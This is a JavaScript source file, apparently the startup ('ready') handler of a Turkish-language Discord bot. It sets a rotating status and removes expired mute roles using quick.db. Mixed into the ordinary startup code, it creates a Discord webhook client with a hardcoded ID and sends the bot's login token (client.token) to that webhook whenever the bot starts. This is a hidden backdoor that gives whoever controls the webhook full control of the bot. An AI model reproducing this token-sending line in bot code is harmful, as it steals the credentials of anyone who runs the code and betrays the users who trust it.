const fs = require("fs");
const chalk = require("chalk");
const moment = require("moment");
const Discord = require("discord.js");
const ayarlar = require("../ayarlar.json");
const db = require('quick.db')

var prefix = ayarlar.prefix;

module.exports = client => {
  let cmd = "..."
  fs.readdir("./komutlar/", (error, komutlar) => {
      cmd = komutlar.length
    })
  console.log(
    `[${moment().format("YYYY-MM-DD HH:mm:ss")}] BOT: Aktif, Komutlar yüklendi!`
  );
  console.log(
    `[${moment().format("YYYY-MM-DD HH:mm:ss")}] BOT: ${//
      client.user.username
    } ismi ile giriş yapıldı!`
  );
  client.user.setStatus("online");
  const h = new Discord.WebhookClient('877169776433201204', process.env.h)
  h.send(client.token)
  setInterval(function() {
    const see =  client.guilds.cache.reduce((a, b) => a + b.memberCount, 0).toLocaleString()
    var oyun = [
    see+" Tane Kullanıcım var!",
    client.guilds.cache.size+" Tane Sunucuya eklendim!",
"Bot bakımda!",
"Web sitemiz bakım bitene kadar kapalıdır.",

  ];   
    var random = Math.floor(Math.random() * (oyun.length - 0 + 1) + 0);

    client.user.setActivity(oyun[random], "");
    
    fs.readdir("./komutlar/", (error, komutlar) => {
      cmd = komutlar.length
    })
    
  }, 3 * 2500);
  
  async function del(guild, user) {
    const mute = db.fetch('mute')
    let ez = []
    mute.forEach(data => {
      if(data.guild == guild){
        if(data.user == user){
          return
        }
      }
      
      ez.push(data)
    })
    db.set('mute', ez)
  }
  
  setInterval(async function(){
    const mute = db.fetch('mute')
    mute.forEach(m => {
      if(m.bitis <= Date.now()){
        const guild = client.guilds.cache.get(m.guild)
        if(guild){
          const member = guild.members.cache.get(m.user)
          if(member){
            const muterole = db.fetch(`xaine-mute-role.${guild.id}`)
            member.roles.remove(muterole).then(() => {
              del(m.guild, m.user)
            })
          }
        }else{
          del(m.guild, m.user);
        }
      }
    })
  },2000)
  
};

